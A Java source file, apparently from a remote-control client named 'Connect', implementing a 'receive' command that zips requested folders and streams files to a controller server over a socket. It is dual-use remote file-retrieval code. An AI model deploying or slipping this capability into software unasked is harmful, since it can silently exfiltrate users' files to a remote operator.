package br.com.introcdc.connect.client.commands.file.external;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:41
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class ClientCommandReceive extends ClientCommand {

    public ClientCommandReceive() {
        super("receive");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um arquivo!");
            return;
        }
        String[] filesArray = input.split(";");
        new Thread(() -> {
            for (String inputInfo : filesArray) {
                File file = FileComponents.file(inputInfo);
                boolean temp = false;
                boolean notFound = false;
                if (file.exists()) {
                    if (file.isDirectory()) {
                        temp = true;
                        msg("Pasta " + file.getName() + " sendo zipada para recebimento...");
                        File objective = FileComponents.ZIP_LOCAL ? new File("file.zip") : new File(FileComponents.FOLDER, "file.zip");
                        FileComponents.createZip(file, objective, FileComponents.FOLDER.replace("\\", "/") + "/");
                        msg("Pasta " + file.getName() + " zipada!");
                        file = objective;
                    }
                } else {
                    notFound = true;
                    msg("Arquivo não encontrado!");
                }

                if (!notFound) {
                    File fileToSend = file;
                    boolean temporary = temp;
                    msg("Enviando arquivo " + fileToSend.getName() + "...");
                    msg("receive-file");
                    Runnable runnable = () -> {
                        try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT + 3);
                             DataOutputStream dos = new DataOutputStream(fileSocket.getOutputStream());
                             BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
                            dos.writeUTF(FileComponents.removeCharacters(fileToSend.getName()));
                            dos.flush();
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = bis.read(buffer)) != -1) {
                                dos.write(buffer, 0, bytesRead);
                            }
                        } catch (Exception exception) {
                            msg("Ocorreu um erro ao enviar o arquivo: (" + exception.getMessage() + ")");
                            exception(exception);
                        }
                        if (temporary) {
                            FileComponents.deleteFile(fileToSend);
                        }
                    };
                    if (filesArray.length == 1) {
                        ConnectClient.EXECUTOR.schedule(() -> new Thread(runnable).start(), 1, TimeUnit.SECONDS);
                    } else {
                        runnable.run();
                        try {
                            Thread.sleep(1000);
                        } catch (Exception ignored) {
                        }
                    }
                }
            }
        }).start();
    }

}
